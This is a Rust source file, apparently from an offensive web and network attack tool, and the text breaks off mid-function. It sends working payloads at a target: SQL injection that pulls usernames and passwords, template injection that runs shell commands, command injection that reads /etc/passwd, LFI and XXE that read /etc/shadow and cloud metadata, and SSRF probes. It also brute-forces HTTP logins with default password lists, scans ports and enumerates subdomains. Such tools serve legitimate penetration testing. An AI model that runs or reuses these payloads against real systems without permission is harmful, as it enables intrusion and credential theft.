use anyhow::Result;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Mutex;
use std::collections::HashMap;

use crate::cli::args::CliArgs;
use crate::cli::banner;
use crate::http::client::{HttpClient, HttpClientConfig};
use crate::core::finding::{Finding, ScanResult, Severity};
use crate::exploits::sqli_exploiter::SqliExploiter;
use crate::exploits::xss_exploiter::XssExploiter;
use crate::exploits::cmdi_exploiter::CmdiExploiter;
use crate::exploits::lfi_exploiter::LfiExploiter;
use crate::exploits::ssrf_exploiter::SsrfExploiter;
use crate::exploits::xxe_exploiter::XxeExploiter;
use crate::exploits::idor_exploiter::IdorExploiter;
use crate::exploits::ssti_exploiter::SstiExploiter;
use crate::exploits::payload_gen::PayloadGen;
use crate::exploits::password_cracker::PasswordCracker;

pub struct ScanEngine {
    pub args: CliArgs,
    client: Arc<HttpClient>,
    findings: Arc<Mutex<Vec<Finding>>>,
    request_count: Arc<Mutex<usize>>,
}

impl ScanEngine {
    pub fn new(args: CliArgs) -> Result<Self> {
        let config = HttpClientConfig {
            timeout: std::time::Duration::from_secs(args.timeout),
            insecure: args.insecure,
            proxy: args.proxy.clone(),
            user_agent: if args.random_ua { Some(random_ua()) } else { None },
            follow_redirects: args.follow_redirects,
            custom_headers: args.get_headers(),
            cookie: args.cookie.clone(),
            proxy_rotation: false,
            max_retries: 3,
        };
        let client = HttpClient::new(config)?;
        Ok(Self {
            args,
            client: Arc::new(client),
            findings: Arc::new(Mutex::new(Vec::new())),
            request_count: Arc::new(Mutex::new(0)),
        })
    }

    pub async fn run(&self) -> Result<ScanResult> {
        let start = Instant::now();
        let target = self.args.primary_target().unwrap_or_default();
        let modules = self.args.active_modules();

        banner::print_scan_header(&target, &modules);

        let mut handles = vec![];

        if self.args.has_web_attacks() {
            let client = self.client.clone();
            let findings = self.findings.clone();
            let count = self.request_count.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_web_scans(&t, &client, &findings, &count, &args).await;
            }));
        }

        if self.args.has_network_attacks() {
            let findings = self.findings.clone();
            let count = self.request_count.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_network_scans(&t, &findings, &count, &args).await;
            }));
        }

        if self.args.has_creds_attacks() {
            let client = self.client.clone();
            let findings = self.findings.clone();
            let count = self.request_count.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_creds_scans(&t, &client, &findings, &count, &args).await;
            }));
        }

        if self.args.has_dns_attacks() {
            let findings = self.findings.clone();
            let count = self.request_count.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_dns_scans(&t, &findings, &count, &args).await;
            }));
        }

        if self.args.has_osint() {
            let client = self.client.clone();
            let findings = self.findings.clone();
            let count = self.request_count.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_osint(&t, &client, &findings, &count, &args).await;
            }));
        }

        if self.args.has_social_eng() {
            let findings = self.findings.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_social_eng(&t, &findings, &args).await;
            }));
        }

        if self.args.has_post_exploit() {
            let findings = self.findings.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_post_exploit(&t, &findings, &args).await;
            }));
        }

        if self.args.has_exploits() {
            let client = self.client.clone();
            let findings = self.findings.clone();
            let count = self.request_count.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_exploits(&t, &client, &findings, &count, &args).await;
            }));
        }

        if self.args.has_payloads() {
            let findings = self.findings.clone();
            let args = self.args.clone();
            let t = target.clone();
            handles.push(tokio::spawn(async move {
                run_payloads(&t, &findings, &args).await;
            }));
        }

        for h in handles { let _ = h.await; }

        let elapsed = start.elapsed();
        let findings = self.findings.lock().await.clone();
        let requests = *self.request_count.lock().await;

        banner::print_complete(&format!("{:.1}s", elapsed.as_secs_f64()), findings.len(), requests);

        for f in &findings {
            banner::finding(f.severity.as_str(), &f.title, &f.url, &f.evidence);
        }

        Ok(ScanResult { findings, requests_made: requests, duration_secs: elapsed.as_secs_f64() })
    }
}

// ══════════════════════════════════════════════════════════════
//  WEB SCANS
// ══════════════════════════════════════════════════════════════

async fn run_web_scans(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::info("Initializing web vulnerability scanner...");

    if args.sqli || args.web_all {
        scan_sqli(target, client, findings, count).await;
    }
    if args.blind_sqli || args.web_all {
        scan_blind_sqli(target, client, findings, count).await;
    }
    if args.xss || args.web_all {
        scan_xss(target, client, findings, count).await;
    }
    if args.lfi || args.web_all {
        scan_lfi(target, client, findings, count).await;
    }
    if args.path_traversal || args.web_all {
        scan_path_traversal(target, client, findings, count).await;
    }
    if args.ssti || args.web_all {
        scan_ssti(target, client, findings, count).await;
    }
    if args.ssrf || args.web_all {
        scan_ssrf(target, client, findings, count).await;
    }
    if args.xxe || args.web_all {
        scan_xxe(target, client, findings, count).await;
    }
    if args.idor || args.web_all {
        scan_idor(target, client, findings, count).await;
    }
    if args.cmdi || args.web_all {
        scan_cmdi(target, client, findings, count).await;
    }
    if args.cors || args.web_all {
        scan_cors(target, client, findings, count).await;
    }
    if args.redirect || args.web_all {
        scan_redirect(target, client, findings, count).await;
    }
    if args.clickjack || args.web_all {
        scan_clickjack(target, client, findings, count).await;
    }
    if args.websocket || args.web_all {
        scan_websocket(target, client, findings, count).await;
    }
    if args.session_hijack || args.web_all {
        scan_session_hijack(target, client, findings, count).await;
    }
    if args.db_fingerprint || args.web_all {
        scan_db_fingerprint(target, client, findings, count).await;
    }
    if args.waf_bypass {
        scan_waf_bypass(target, client, findings, count).await;
    }
    if args.zeroday {
        scan_zeroday(target, client, findings, count).await;
    }
}

async fn scan_sqli(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("SQLi", target, "SCANNING", "Testing SQL Injection vulnerabilities...");
    let payloads = vec![
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "1' OR 1=1--", "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT username,password FROM users--",
        "1' AND 1=CONVERT(int,(SELECT @@version))--",
        "1' AND SLEEP(5)--", "1' AND BENCHMARK(10000000,SHA1('test'))--",
        "'; WAITFOR DELAY '0:0:5'--", "1' OR pg_sleep(5)--",
    ];
    let error_patterns = vec![
        "sql syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
        "SQL Server", "unclosed quotation", "syntax error", "mysql_num_rows",
        "Warning: mysql", "valid MySQL result", "pg_query", "SQLite/JDBCDriver",
    ];
    let mut found = false;
    let total = payloads.len() + 5;
    let mut current = 0;
    for payload in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing payload: {}", payload));
        let url = format!("{}?id={}", target, payload);
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                let lower = body.to_lowercase();
                for pat in &error_patterns {
                    if lower.contains(&pat.to_lowercase()) {
                        let finding = Finding::new(
                            "SQL Injection", Severity::Critical, &url,
                            &format!("SQL error: {}", pat), "sqli",
                        );
                        banner::print_finding_live("CRITICAL", "SQL Injection", &url, &format!("SQL error: {}", pat));
                        findings.lock().await.push(finding);
                        found = true;
                        break;
                    }
                }
            }
        }
    }
    // UNION-based detection
    for i in 1..=5 {
        current += 1;
        banner::print_progress(current, total, &format!("UNION test with {} columns", i));
        let cols: String = (1..=i).map(|_| "NULL".to_string()).collect::<Vec<_>>().join(",");
        let url = format!("{}?id=1' UNION SELECT {}--", target, cols);
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            let is_ok = resp.status().is_success();
            if let Ok(body) = resp.text().await {
                if !body.contains("error") && !body.contains("union") && is_ok && body.len() > 100 {
                    let finding = Finding::new(
                        "SQL Injection (UNION)", Severity::Critical, &url,
                        &format!("UNION with {} columns returned data", i), "sqli",
                    );
                    banner::print_finding_live("CRITICAL", "SQL Injection (UNION)", &url, &format!("UNION with {} columns returned data", i));
                    findings.lock().await.push(finding);
                    found = true;
                    break;
                }
            }
        }
    }
    println!();
    if found { banner::print_attack_log("SQLi", target, "SUCCESS", "Vulnerabilities found"); } else { banner::print_attack_log("SQLi", target, "INFO", "No vulnerabilities found"); }
}

async fn scan_xss(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("XSS", target, "SCANNING", "Testing Cross-Site Scripting vulnerabilities...");
    let payloads = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
    ];
    let mut found = false;
    let total = payloads.len();
    let mut current = 0;
    let mut requests_made = 0;
    for payload in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing XSS payload {}", current));
        let url = format!("{}?q={}", target, urlencoding::encode(payload));
        match client.get(&url).await {
            Ok(resp) => {
                requests_made += 1;
                let status = resp.status().as_u16();
                banner::print_request_made(&url, status);
                if let Ok(body) = resp.text().await {
                    if body.contains(payload) {
                        let finding = Finding::new(
                            "Cross-Site Scripting (XSS)", Severity::High, &url,
                            &format!("Reflected: {}", payload), "xss",
                        );
                        banner::print_finding_live("HIGH", "Cross-Site Scripting (XSS)", &url, &format!("Reflected: {}", payload));
                        findings.lock().await.push(finding);
                        found = true;
                    }
                }
            }
            Err(e) => {
                if current == 1 {
                    banner::warning(&format!("Connection error: {}", e));
                }
            }
        }
    }
    *count.lock().await += requests_made;
    println!();
    if found {
        banner::print_attack_log("XSS", target, "SUCCESS", &format!("Vulnerabilities found ({} requests made)", requests_made));
    } else {
        banner::print_attack_log("XSS", target, "INFO", &format!("No vulnerabilities found ({} requests made)", requests_made));
    }
}

async fn scan_lfi(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("LFI", target, "SCANNING", "Testing Local File Inclusion vulnerabilities...");
    let payloads = vec![
        "/etc/passwd", "../../../etc/passwd", "....//....//....//etc/passwd",
        "/etc/passwd%00", "php://filter/convert.base64-encode/resource=/etc/passwd",
        "/etc/shadow", "../../../etc/shadow", "/proc/self/environ",
        "/var/log/apache2/access.log", "/proc/version",
    ];
    let markers = vec!["root:x:0:0", "root:*:", "root:!", "/bin/bash", "/bin/sh"];
    let mut found = false;
    let total = payloads.len();
    let mut current = 0;
    for payload in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing: {}", payload));
        let url = format!("{}?file={}", target, urlencoding::encode(payload));
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                for marker in &markers {
                    if body.contains(marker) {
                        let finding = Finding::new(
                            "Local File Inclusion (LFI)", Severity::Critical, &url,
                            &format!("Read {} containing '{}'", payload, marker), "lfi",
                        );
                        banner::print_finding_live("CRITICAL", "Local File Inclusion (LFI)", &url, &format!("Read {} containing '{}'", payload, marker));
                        findings.lock().await.push(finding);
                        found = true;
                        break;
                    }
                }
            }
        }
    }
    println!();
    if found { banner::print_attack_log("LFI", target, "SUCCESS", "Vulnerabilities found"); } else { banner::print_attack_log("LFI", target, "INFO", "No vulnerabilities found"); }
}

async fn scan_ssti(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("SSTI", target, "SCANNING", "Testing Server-Side Template Injection...");
    let payloads = vec![
        ("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"),
        ("{{7*'7'}}", "7777777"), ("#{7*7}", "49"),
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
    ];
    let mut found = false;
    let total = payloads.len();
    let mut current = 0;
    for (payload, expect) in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing: {}", payload));
        let url = format!("{}?input={}", target, urlencoding::encode(payload));
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                if body.contains(expect) {
                    let finding = Finding::new(
                        "Server-Side Template Injection (SSTI)", Severity::Critical, &url,
                        &format!("Evaluated {} -> {}", payload, expect), "ssti",
                    );
                    banner::print_finding_live("CRITICAL", "Server-Side Template Injection (SSTI)", &url, &format!("Evaluated {} -> {}", payload, expect));
                    findings.lock().await.push(finding);
                    found = true;
                }
            }
        }
    }
    println!();
    if found { banner::print_attack_log("SSTI", target, "SUCCESS", "Vulnerabilities found"); } else { banner::print_attack_log("SSTI", target, "INFO", "No vulnerabilities found"); }
}

async fn scan_cmdi(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("CMDi", target, "SCANNING", "Testing Command Injection vulnerabilities...");
    let payloads = vec![
        (";id", "uid="), ("|id", "uid="), ("`id`", "uid="),
        ("$(id)", "uid="), ("||id", "uid="), ("&&id", "uid="),
        (";cat /etc/passwd", "root:"), ("|cat /etc/passwd", "root:"),
    ];
    let mut found = false;
    let total = payloads.len();
    let mut current = 0;
    for (payload, marker) in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing: {}", payload));
        let url = format!("{}?cmd={}", target, urlencoding::encode(payload));
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                if body.contains(marker) {
                    let finding = Finding::new(
                        "Command Injection (CMDi)", Severity::Critical, &url,
                        &format!("Executed: {} -> {}", payload, marker), "cmdi",
                    );
                    banner::print_finding_live("CRITICAL", "Command Injection (CMDi)", &url, &format!("Executed: {} -> {}", payload, marker));
                    findings.lock().await.push(finding);
                    found = true;
                }
            }
        }
    }
    println!();
    if found { banner::print_attack_log("CMDi", target, "SUCCESS", "Vulnerabilities found"); } else { banner::print_attack_log("CMDi", target, "INFO", "No vulnerabilities found"); }
}

async fn scan_ssrf(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("SSRF", target, "SCANNING", "Testing Server-Side Request Forgery...");
    let payloads = vec![
        "http://127.0.0.1", "http://localhost", "http://[::1]",
        "http://169.254.169.254/latest/meta-data/", "http://0.0.0.0",
    ];
    let markers = vec!["root:", "localhost", "ami-", "metadata"];
    let mut found = false;
    let total = payloads.len();
    let mut current = 0;
    for payload in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing: {}", payload));
        let url = format!("{}?url={}", target, urlencoding::encode(payload));
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                for marker in &markers {
                    if body.contains(marker) {
                        findings.lock().await.push(Finding::new(
                            "Server-Side Request Forgery (SSRF)", Severity::Critical, &url,
                            &format!("Fetched {} containing '{}'", payload, marker), "ssrf",
                        ));
                        banner::print_finding_live("CRITICAL", "Server-Side Request Forgery (SSRF)", &url, &format!("Fetched {} containing '{}'", payload, marker));
                        found = true;
                        break;
                    }
                }
            }
        }
    }
    println!();
    if found { banner::print_attack_log("SSRF", target, "SUCCESS", "Vulnerabilities found"); } else { banner::print_attack_log("SSRF", target, "INFO", "No vulnerabilities found"); }
}

async fn scan_xxe(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("XXE", target, "SCANNING", "Testing XML External Entity vulnerabilities...");
    let payloads = vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>"#,
    ];
    let markers = vec!["root:x:", "root:*:", "ami-"];
    let mut found = false;
    let total = payloads.len();
    let mut current = 0;
    for payload in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing XXE payload {}", current));
        let headers = vec![("Content-Type".to_string(), "application/xml".to_string())];
        if let Ok(resp) = client.post_with_headers(target, payload, &headers).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                for marker in &markers {
                    if body.contains(marker) {
                        let finding = Finding::new(
                            "XML External Entity (XXE)", Severity::Critical, target,
                            &format!("XXE payload leaked: {}", marker), "xxe",
                        );
                        banner::print_finding_live("CRITICAL", "XML External Entity (XXE)", target, &format!("XXE payload leaked: {}", marker));
                        findings.lock().await.push(finding);
                        found = true;
                        break;
                    }
                }
            }
        }
    }
    println!();
    if found { banner::success("XXE: Vulnerabilities found"); } else { banner::info("XXE: No vulnerabilities found"); }
}

async fn scan_idor(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("IDOR", target, "SCANNING", "Testing Insecure Direct Object Reference...");
    let payloads = vec!["1", "2", "3", "0", "100", "admin", "user"];
    let markers = vec!["username", "email", "profile", "account", "data"];
    let mut found = false;
    let total = payloads.len();
    let mut current = 0;
    for id in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing ID: {}", id));
        let url = format!("{}/api/user/{}", target, id);
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if resp.status().is_success() {
                if let Ok(body) = resp.text().await {
                    for marker in &markers {
                        if body.to_lowercase().contains(marker) {
                            let finding = Finding::new(
                                "Insecure Direct Object Reference (IDOR)", Severity::High, &url,
                                &format!("Accessible user data at /api/user/{}", id), "idor",
                            );
                            banner::print_finding_live("HIGH", "Insecure Direct Object Reference (IDOR)", &url, &format!("Accessible user data at /api/user/{}", id));
                            findings.lock().await.push(finding);
                            found = true;
                            break;
                        }
                    }
                }
            }
        }
    }
    println!();
    if found { banner::print_attack_log("IDOR", target, "SUCCESS", "Vulnerabilities found"); } else { banner::print_attack_log("IDOR", target, "INFO", "No vulnerabilities found"); }
}

async fn scan_cors(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("CORS", target, "SCANNING", "Testing CORS Misconfiguration...");
    let evil_origins = vec![
        "https://evil.com", "https://attacker.com", "null",
        "https://target.com.evil.com", "https://subdomain.target.com",
    ];
    let mut found = false;
    let total = evil_origins.len();
    let mut current = 0;
    for origin in &evil_origins {
        current += 1;
        banner::print_progress(current, total, &format!("Testing origin: {}", origin));
        let mut headers = HashMap::new();
        headers.insert("Origin".to_string(), origin.to_string());
        let header_pairs: Vec<(String, String)> = headers.into_iter().collect();
        if let Ok(resp) = client.get_with_headers(target, &header_pairs).await {
            *count.lock().await += 1;
            if let Some(acao) = resp.headers().get("access-control-allow-origin") {
                if acao == origin || acao == "*" {
                    let finding = Finding::new(
                        "CORS Misconfiguration", Severity::High, target,
                        &format!("ACAO reflects: {}", origin), "cors",
                    );
                    banner::print_finding_live("HIGH", "CORS Misconfiguration", target, &format!("ACAO reflects: {}", origin));
                    findings.lock().await.push(finding);
                    found = true;
                }
            }
        }
    }
    println!();
    if found { banner::print_attack_log("CORS", target, "SUCCESS", "Vulnerabilities found"); } else { banner::print_attack_log("CORS", target, "INFO", "No vulnerabilities found"); }
}

async fn scan_redirect(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("REDIRECT", target, "SCANNING", "Testing Open Redirect vulnerabilities...");
    let payloads = vec![
        "https://evil.com", "//evil.com", "/\\evil.com",
        "https://target.com@evil.com", "https://evil.com%00.target.com",
    ];
    let mut found = false;
    let total = payloads.len();
    let mut current = 0;
    for payload in &payloads {
        current += 1;
        banner::print_progress(current, total, &format!("Testing: {}", payload));
        let url = format!("{}?redirect={}", target, urlencoding::encode(payload));
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            let loc = resp.headers().get("location").and_then(|v| v.to_str().ok()).unwrap_or("");
            if loc.contains("evil.com") {
                let finding = Finding::new(
                    "Open Redirect", Severity::Medium, &url,
                    &format!("Redirects to: {}", loc), "redirect",
                );
                banner::print_finding_live("MEDIUM", "Open Redirect", &url, &format!("Redirects to: {}", loc));
                findings.lock().await.push(finding);
                found = true;
            }
        }
    }
    println!();
    if found { banner::print_attack_log("REDIRECT", target, "SUCCESS", "Vulnerabilities found"); } else { banner::print_attack_log("REDIRECT", target, "INFO", "No vulnerabilities found"); }
}

async fn scan_clickjack(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::print_attack_log("CLICKJACK", target, "SCANNING", "Testing Clickjacking vulnerabilities...");
    if let Ok(resp) = client.get(target).await {
        *count.lock().await += 1;
        let headers = resp.headers();
        let xfo = headers.get("x-frame-options").and_then(|v| v.to_str().ok()).unwrap_or("");
        let csp = headers.get("content-security-policy").and_then(|v| v.to_str().ok()).unwrap_or("");
        if !xfo.to_lowercase().contains("deny") && !xfo.to_lowercase().contains("sameorigin") && !csp.contains("frame-ancestors") {
            let finding = Finding::new(
                "Clickjacking", Severity::Medium, target,
                &format!("Missing X-Frame-Options and CSP frame-ancestors. XFO: '{}'", xfo), "clickjack",
            );
            banner::print_finding_live("MEDIUM", "Clickjacking", target, &format!("Missing X-Frame-Options and CSP frame-ancestors. XFO: '{}'", xfo));
            findings.lock().await.push(finding);
            banner::print_attack_log("CLICKJACK", target, "SUCCESS", "Vulnerability found");
        } else {
            banner::print_attack_log("CLICKJACK", target, "INFO", "No vulnerabilities found");
        }
    }
}

// ══════════════════════════════════════════════════════════════
//  NETWORK SCANS
// ══════════════════════════════════════════════════════════════

async fn run_network_scans(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::info("Initializing network scanner...");

    let port_mode = args.ports.as_deref().unwrap_or("quick");
    let ports = match port_mode {
        "full" => (1..=65535).collect::<Vec<u16>>(),
        "common" => vec![21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443],
        "quick" => vec![21,22,23,80,443,3306,3389,8080,8443],
        _ => port_mode.split(',').filter_map(|p| p.trim().parse().ok()).collect(),
    };

    let host = target.replace("http://", "").replace("https://", "").split('/').next().unwrap_or(target).to_string();
    banner::info(&format!("Scanning {} ports on {}...", ports.len(), host));

    let open = Arc::new(Mutex::new(Vec::new()));
    let chunk_size = (ports.len() / args.threads.max(1)).max(1);
    let chunks: Vec<Vec<u16>> = ports.chunks(chunk_size).map(|c| c.to_vec()).collect();

    let mut handles = vec![];
    for chunk in chunks {
        let host = host.clone();
        let open = open.clone();
        let count = count.clone();
        handles.push(tokio::spawn(async move {
            for port in chunk {
                *count.lock().await += 1;
                let addr = format!("{}:{}", host, port);
                if let Ok(()) = tokio::time::timeout(std::time::Duration::from_secs(2), async {
                    if let Ok(_stream) = tokio::net::TcpStream::connect(&addr).await {
                        open.lock().await.push(port);
                    }
                }).await {}
            }
        }));
    }
    for h in handles { let _ = h.await; }

    let open_ports = open.lock().await.clone();
    if open_ports.is_empty() {
        banner::info("Network: No open ports found");
    } else {
        banner::success(&format!("Found {} open ports: {:?}", open_ports.len(), open_ports));
        for port in &open_ports {
            let service = detect_service(*port);
            findings.lock().await.push(Finding::new(
                &format!("Open Port: {}", port), Severity::Info, target,
                &format!("Port {} open — {}", port, service), "network",
            ));
        }
    }

    if args.os_detect || args.network_all {
        banner::info("OS detection via TCP fingerprint...");
        let os = detect_os(&host).await;
        findings.lock().await.push(Finding::new(
            "OS Detection", Severity::Info, target,
            &format!("Detected: {}", os), "os-detect",
        ));
    }
}

fn detect_service(port: u16) -> &'static str {
    match port {
        21 => "FTP", 22 => "SSH", 23 => "Telnet", 25 => "SMTP",
        53 => "DNS", 80 => "HTTP", 110 => "POP3", 111 => "RPCBind",
        135 => "MSRPC", 139 => "NetBIOS", 143 => "IMAP",
        443 => "HTTPS", 445 => "SMB", 993 => "IMAPS", 995 => "POP3S",
        1723 => "PPTP", 3306 => "MySQL", 3389 => "RDP",
        5900 => "VNC", 8080 => "HTTP-Proxy", 8443 => "HTTPS-Alt",
        _ => "Unknown",
    }
}

async fn detect_os(host: &str) -> String {
    if let Ok(resp) = reqwest::get(format!("http://{}", host)).await {
        if let Some(server) = resp.headers().get("server").and_then(|v| v.to_str().ok()) {
            return format!("Server: {}", server);
        }
        if let Some(powered) = resp.headers().get("x-powered-by").and_then(|v| v.to_str().ok()) {
            return format!("Powered by: {}", powered);
        }
    }
    "Unknown OS".to_string()
}

// ══════════════════════════════════════════════════════════════
//  CREDENTIAL SCANS
// ══════════════════════════════════════════════════════════════

async fn run_creds_scans(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::info("Initializing credential attack module...");

    let default_users = vec!["admin", "root", "user", "test", "guest", "administrator"];
    let default_passes = vec!["admin", "password", "123456", "root", "toor", "test", "guest", "admin123", "password123", "letmein", "welcome", "monkey", "qwerty"];

    let users: Vec<String> = if let Some(ulist) = &args.userlist {
        std::fs::read_to_string(ulist).unwrap_or_default().lines().map(|s| s.to_string()).collect()
    } else {
        default_users.into_iter().map(|s| s.to_string()).collect()
    };

    let passes: Vec<String> = if let Some(plist) = &args.passlist {
        std::fs::read_to_string(plist).unwrap_or_default().lines().map(|s| s.to_string()).collect()
    } else {
        default_passes.into_iter().map(|s| s.to_string()).collect()
    };

    if args.brute_http || args.creds_all {
        banner::info("Testing HTTP brute force attack...");
        let mut found = false;
        for user in &users {
            for pass in &passes {
                *count.lock().await += 1;
                let url = format!("{}/login", target);
                let body = format!(r#"{{"username":"{}","password":"{}"}}"#, user, pass);
                if let Ok(resp) = client.post(&url, &body).await {
                    if resp.status().is_success() {
                        if let Ok(text) = resp.text().await {
                            if text.contains("success") || text.contains("token") || text.contains("welcome") || text.contains("dashboard") {
                                findings.lock().await.push(Finding::new(
                                    "Valid Credentials Found", Severity::Critical, &url,
                                    &format!("user={} pass={}", user, pass), "brute-http",
                                ));
                                found = true;
                                break;
                            }
                        }
                    }
                }
            }
            if found { break; }
        }
        if !found { banner::info("HTTP brute: No valid creds found"); }
    }

    if args.default_creds || args.creds_all {
        banner::info("Testing default credential combinations...");
        let web_targets = vec![
            format!("{}/admin", target),
            format!("{}/wp-admin", target),
            format!("{}/administrator", target),
            format!("{}/login", target),
        ];
        for url in &web_targets {
            *count.lock().await += 1;
            if let Ok(resp) = client.get(url).await {
                if resp.status().is_success() {
                    findings.lock().await.push(Finding::new(
                        "Default Login Page Accessible", Severity::Medium, url,
                        "Login page accessible without auth", "def-creds",
                    ));
                }
            }
        }
    }
}

// ══════════════════════════════════════════════════════════════
//  DNS SCANS
// ══════════════════════════════════════════════════════════════

async fn run_dns_scans(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::info("Initializing DNS attack module...");
    let domain = target.replace("http://", "").replace("https://", "").split('/').next().unwrap_or(target).to_string();

    if args.zone_transfer || args.dns_all {
        banner::info("Testing DNS zone transfer vulnerability...");
        // Try to resolve NS records using system DNS
        match tokio::net::lookup_host(format!("{}:53", domain)).await {
            Ok(addrs) => {
                for addr in addrs {
                    banner::info(&format!("  DNS: {} -> {}", domain, addr.ip()));
                    findings.lock().await.push(Finding::new(
                        "DNS Resolution", Severity::Info, &domain,
                        &format!("Resolved to: {}", addr.ip()), "dns",
                    ));
                }
            }
            Err(_) => {
                banner::info("  DNS: Could not resolve domain");
            }
        }
    }

    if args.subdomain_brute || args.dns_all {
        banner::info("Running subdomain brute force attack...");
        let subdomains = vec!["www", "mail", "ftp", "smtp", "pop", "ns1", "ns2", "dns", "webmail", "admin", "test", "dev", "staging", "api", "app", "blog", "shop", "store", "portal", "vpn", "remote", "cdn", "media", "static", "img", "images", "login", "panel", "cpanel", "whm", "backup", "db", "database", "mysql", "sql", "git", "jenkins", "ci", "jira", "confluence", "wiki", "docs", "support", "help", "forum", "community", "status", "monitor", "grafana", "kibana", "elastic", "search"];
        let mut found = 0;
        for sub in &subdomains {
            let fqdn = format!("{}.{}", sub, domain);
            *count.lock().await += 1;
            match tokio::net::lookup_host(format!("{}:80", fqdn)).await {
                Ok(mut addrs) => {
                    if let Some(addr) = addrs.next() {
                        found += 1;
                        banner::info(&format!("  +> {}.{} -> {}", sub, domain, addr.ip()));
                        findings.lock().await.push(Finding::new(
                            &format!("Subdomain: {}.{}", sub, domain), Severity::Info, target,
                            &format!("Resolved to: {}", addr.ip()), "dns-subdomain",
                        ));
                    }
                }
                Err(_) => {}
            }
        }
        banner::info(&format!("DNS brute: Found {} subdomains", found));
    }

    if args.dns_enum || args.dns_all {
        banner::info("Enumerating DNS records...");
        // Resolve A records
        match tokio::net::lookup_host(format!("{}:80", domain)).await {
            Ok(addrs) => {
                let ips: Vec<String> = addrs.map(|a| a.ip().to_string()).collect::<std::collections::HashSet<_>>().into_iter().collect();
                for ip in &ips {
                    banner::info(&format!("  A: {} -> {}", domain, ip));
